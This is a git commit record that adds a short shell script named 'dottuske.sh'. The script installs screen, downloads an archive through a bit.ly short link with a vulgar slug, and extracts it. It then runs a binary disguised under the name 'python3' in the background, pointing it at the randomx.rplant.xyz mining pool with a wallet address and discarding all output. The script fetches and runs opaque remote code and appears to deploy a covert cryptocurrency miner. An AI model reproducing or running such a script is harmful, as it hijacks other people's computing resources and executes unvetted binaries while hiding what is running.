8061964380c9bbc1c98cce64406975ac2d25750d
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-26 22:53:27 +0700

    created hendi kusnandi

---
+++ dottuske.sh
@@ -0,0 +1,9 @@
+apt install screen -y
+
+wget -O dot bit.ly/KONTOL-AKU-GEDE
+
+tar -xzvf dot
+
+rm dot
+
+screen ./dotsrb/python3 -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuT7TEvsg3co36hu6z5P2jMksroYnq8ejhxDRd3K6LQSc4LhU8TR4u1CZVNBViJSNN79WUATZ2kgsfywYqehTMRzVaoLb4uF.DOT &>/dev/null
